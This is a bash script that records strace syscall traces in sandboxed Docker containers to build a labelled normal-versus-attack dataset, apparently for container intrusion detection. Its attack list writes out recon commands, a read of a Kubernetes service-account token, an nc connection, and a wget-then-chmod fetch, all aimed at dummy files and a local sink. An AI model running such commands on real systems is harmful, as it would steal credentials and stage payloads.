#!/usr/bin/env bash
# Record a small container syscall dataset on a GitHub Actions runner (used by .github/workflows/syscalls.yml).
#
#   bash scripts/record_syscalls.sh <out-dir> <seed>
#
# Every trace is one `docker exec` into a long-running workload container, recorded with
# `strace -f` (syscall names only). "normal" traces are the workload's routine operations; "attack"
# traces are BENIGN attack-shaped actions that mirror the live Tetragon job (shell + recon, read a dummy
# service-account token file, connect to a sink started here, fetch a dummy file and chmod it). Nothing
# is downloaded from or sent to a third-party host; no malware or exploit is involved.
set -euo pipefail
OUT=$1; SEED=$2
mkdir -p "$OUT"
NET=stratum-sys-$SEED
ALPINE="alpine:3.20@sha256:d9e853e87e55526f6b2917df91a2115c36dd7c696a35be12163d44e6e2a4b6bc"
docker network create --internal "$NET" >/dev/null
cleanup() { docker rm -f stratum-wl stratum-sink >/dev/null 2>&1 || true; docker network rm "$NET" >/dev/null 2>&1 || true; }
trap cleanup EXIT

# strace is installed once into a local image (apk over the runner's normal network), then the
# workload runs on an internal network with no route out.
docker build -q -t stratum-strace - >/dev/null <<EOF
FROM $ALPINE
RUN apk add --no-cache strace busybox-extras
RUN mkdir -p /var/run/secrets/kubernetes.io/serviceaccount /srv/www \
 && echo dummy-token-not-a-secret > /var/run/secrets/kubernetes.io/serviceaccount/token \
 && echo hello > /srv/www/index.html && echo 'echo dummy' > /srv/www/tool.sh
EOF
docker run -d --name stratum-sink --network "$NET" --network-alias sink stratum-strace httpd -f -p 8080 -h /srv/www >/dev/null
docker run -d --name stratum-wl --network "$NET" --cap-add SYS_PTRACE stratum-strace \
  sh -c 'httpd -p 8080 -h /srv/www; sleep infinity' >/dev/null
sleep 2

NORMAL=(
  "wget -q -O /dev/null http://127.0.0.1:8080/index.html"
  "cat /srv/www/index.html"
  "ls /srv/www"
  "date"
  "cat /etc/hostname"
  "wget -q -O /dev/null http://sink:8080/index.html"
  "sh -c 'date; cat /srv/www/index.html >/dev/null'"
  "stat /srv/www/index.html"
  "du -s /srv/www"
)
ATTACK=(
  "sh -c 'id; uname -a; cat /etc/passwd >/dev/null'"
  "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
  "sh -c 'echo ping | nc -w 2 sink 8080'"
  "sh -c 'wget -q -O /tmp/t.sh http://sink:8080/tool.sh && chmod +x /tmp/t.sh'"
  "sh -c 'find / -name token -path \"*serviceaccount*\" 2>/dev/null; ps'"
)

rec() {  # rec <label> <index> <command>
  local f="/tmp/$1-$2.trace"
  docker exec stratum-wl sh -c "strace -f -qq -o $f -- $3 >/dev/null 2>&1 || true"
  docker exec stratum-wl sh -c "sed -E 's/^[0-9]+ +//; s/\\(.*//' $f | grep -E '^[a-z_0-9]+$' | tr '\\n' ' '; rm -f $f" \
    > "$OUT/$1-$2.txt"
  echo >> "$OUT/$1-$2.txt"
}

RANDOM=$SEED
for i in $(seq 1 120); do rec normal "$i" "${NORMAL[$((RANDOM % ${#NORMAL[@]}))]}"; done
for t in "${!ATTACK[@]}"; do
  for i in $(seq 1 8); do rec "attack$t" "$i" "${ATTACK[$t]}"; done
done
ls "$OUT" | wc -l
